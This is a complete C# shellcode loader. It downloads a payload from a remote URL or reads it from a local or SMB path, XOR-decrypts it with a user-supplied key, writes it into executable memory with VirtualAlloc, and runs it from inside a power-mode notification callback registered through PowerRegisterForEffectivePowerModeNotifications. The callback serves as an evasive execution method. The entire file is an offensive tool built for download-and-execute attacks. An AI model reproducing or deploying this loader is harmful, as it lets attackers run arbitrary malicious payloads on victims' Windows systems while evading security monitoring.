using System;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.IO;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("powrprof.dll", SetLastError = true)]
    public static extern int PowerRegisterForEffectivePowerModeNotifications(uint Version, Delegate fnNotify, IntPtr pvContext, out IntPtr Handle);

    [DllImport("powrprof.dll", SetLastError = true)]
    public static extern bool PowerUnregisterFromEffectivePowerModeNotifications(IntPtr Handle);
    public delegate void EffectivePowerModeCallback(IntPtr context, EFFECTIVE_POWER_MODE mode);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate void ShellcodeDelegate();


    public enum EFFECTIVE_POWER_MODE : uint
    {
        EffectivePowerModeBatterySaver = 0,
        EffectivePowerModeBetterBattery = 1,
        EffectivePowerModeBalanced = 2,
        EffectivePowerModeHighPerformance = 3,
        EffectivePowerModeMaxPerformance = 4,
        // ... add any other values as needed
    }



    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint MEM_RELEASE = 0x8000;
    const uint EFFECTIVE_POWER_MODE_V2 = 2;

    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: PowerRegisterForEffectivePowerModeNotifications.exe [-r remote_url | local_path_or_SMB_path] [-k xor_key]");
            return;
        }

        string sourcePath = args[1];
        string xorKey = null;

        if (args.Length == 4 && args[2] == "-k")
        {
            xorKey = args[3];
        }

        byte[] shellcode;

        if (args[0] == "-r")
        {
            shellcode = DownloadShellcodeFromUrl(sourcePath);
        }
        else
        {
            shellcode = File.ReadAllBytes(sourcePath);
        }

        if (!string.IsNullOrEmpty(xorKey))
        {
            shellcode = DecryptShellcode(shellcode, xorKey);
        }

        if (shellcode == null || shellcode.Length == 0)
        {
            Console.WriteLine("[Failed] Failed to load or decrypt shellcode.");
            return;
        }

        IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (hAlloc == IntPtr.Zero)
        {
            Console.WriteLine($"[Failed] Memory allocation for shellcode failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }
        else
        {
            Console.WriteLine($"[Success] Memory allocation for shellcode was successful at address: {hAlloc}");
        }

        Marshal.Copy(shellcode, 0, hAlloc, shellcode.Length);

        Console.WriteLine("[Info] Registering for power mode notifications...");

        IntPtr hRegister;
        EffectivePowerModeCallback callback = (context, mode) =>
        {
            ShellcodeDelegate shellcodeFunction = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(hAlloc, typeof(ShellcodeDelegate));
            shellcodeFunction();
        };
        int result = PowerRegisterForEffectivePowerModeNotifications(EFFECTIVE_POWER_MODE_V2, callback, IntPtr.Zero, out hRegister);


        if (result != 0) // Non-zero means error
        {
            Console.WriteLine($"[Failed] Registration for power mode notifications failed. Error Code: {result}");
            VirtualFree(hAlloc, 0, MEM_RELEASE);
            return;
        }

        Console.WriteLine("[Success] Registered for power mode notifications.");

        Console.ReadLine();

        if (hRegister != IntPtr.Zero)
            PowerUnregisterFromEffectivePowerModeNotifications(hRegister);

        VirtualFree(hAlloc, 0, MEM_RELEASE);
    }

    static byte[] DownloadShellcodeFromUrl(string url)
    {
        using (var httpClient = new HttpClient())
        {
            try
            {
                var byteArray = httpClient.GetByteArrayAsync(url).Result;
                if (byteArray != null && byteArray.Length > 0)
                {
                    Console.WriteLine("[Success] Shellcode downloaded successfully.");
                    return byteArray;
                }
                else
                {
                    Console.WriteLine("[Failed] Shellcode downloaded but the content is empty or null.");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Failed] Downloading shellcode: {ex.Message}");
                return null;
            }
        }
    }

    static byte[] DecryptShellcode(byte[] encryptedShellcode, string xorKey)
    {
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];

        if (xorKey.StartsWith("0x"))
        {
            // Single byte XOR key
            byte singleXorKey = Convert.ToByte(xorKey, 16);  // Convert from hex string to byte
            for (int i = 0; i < encryptedShellcode.Length; i++)
            {
                decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ singleXorKey);
            }
        }
        else
        {
            // Multi-byte XOR key (string)
            for (int i = 0; i < encryptedShellcode.Length; i++)
            {
                byte currentXorKey = (byte)xorKey[i % xorKey.Length];  // Loop through the key
                decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ currentXorKey);
            }
        }

        return decryptedShellcode;
    }
}